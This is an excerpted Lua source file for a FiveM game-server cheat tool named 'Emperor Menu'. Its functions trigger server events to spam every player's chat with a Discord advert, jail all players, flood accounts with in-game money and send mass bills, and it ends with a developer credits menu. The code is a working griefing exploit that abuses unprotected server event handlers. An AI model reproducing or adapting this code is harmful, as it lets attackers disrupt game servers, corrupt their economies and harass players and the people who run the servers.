                ...
                Citizen.CreateThread(
                    function()
                        ...
                        for bD = 0, 9 do
                            TriggerServerEvent(
                                '_chat:messageEntered',
                                'Emperor Menu | https://discord.gg/usrFaB',
                                {
                                    141,
                                    211,
                                    255
                        ...
                        for i = 0, 256 do
                            ...
                            TriggerServerEvent(
                                ...
                                GetPlayerServerId(i),
                                'Purposeless',
                                'Emperor Menu | https://discord.gg/usrFaBj ',
                                43161337
                            )
...
function nukeserver()
    Citizen.CreateThread(function()
        ...
        for bs=0,9 do
            TriggerServerEvent("_chat:messageEntered","~r~",{141,211,255},"Emperor Menu | https://discord.gg/usrFaBj ")
        end
        ...
        while true do
			...
			if chatspam then
                TriggerServerEvent(
                    ...
                    'Emperor Menu | https://discord.gg/usrFaBj ',
                    {0, 0x99, 255},
                    '/ooc Emperor Menu | https://discord.gg/usrFaBj '
                )
                TriggerServerEvent('_chat:messageEntered', 'Emperor Menu | https://discord.gg/usrFaBj ', {0, 0x99, 255}, 'Soory Of The Cheating')
            end
			...
			if banallusers then
				...
				TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 45 * 60, "Emperor Menu | https://discord.gg/usrFaBj  ")
				TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 45 * 60, "Emperor Menu | https://discord.gg/usrFaBj ")
				TriggerServerEvent('chatMessageEntered', "SYSTEM", { 0, 0, 0 }, GetPlayerName(PlayerId()) .."Emperor Menu | https://discord.gg/usrFaBj ")
					end
				end
				...
				for i = 0, 128 do
						...
						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(i), "item_money", "money", 10000000)	
						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(i), "item_money", "money", 10000000)	
						TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Emperor Menu | https://discord.gg/usrFaBj ", 10000000)
						TriggerServerEvent('chatMessageEntered', "SYSTEM", { 0, 0, 0 }, GetPlayerName(PlayerId()) .."Emperor Menu | https://discord.gg/usrFaBj ")
				end
			end
...
Citizen.CreateThread(
    function()
        ...
        Plane.CreateMenu("MainMenu", "Emperor Menu")
        ...
        while Enabled do
            ...
            elseif Plane.IsMenuOpened("TrollMenu") then
				...
				for i = 0, 128 do
                    TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Emperor Menu | https://discord.gg/usrFaBj ", "6536955669")
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Emperor Menu | https://discord.gg/usrFaBj ", "6969696969")
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Emperor Menu | https://discord.gg/usrFaBj ", "696G623691")
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Emperor Menu | https://discord.gg/usrFaBj ", "69693553S9")
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Emperor Menu | https://discord.gg/usrFaBj ", "6969696969")
                end
        ...
        drawNotification(
            ...
            elseif Plane.IsMenuOpened("OnlinePlayersMenu") then
				...
				elseif Plane.IsMenuOpened("Credits") then
				    if Plane.Button("~r~~h~zeZ3#0066 Developer & Owner") then
				elseif Plane.Button("~g~~h~SQ.DX#2592 Owner") then
				elseif Plane.Button("~b~~h~𝖔𝖗𝖎#7839 Owner & Coding Helper") then
				elseif Plane.Button("~p~~h~L4 Coding Helper") then
				end
				Plane.Display()
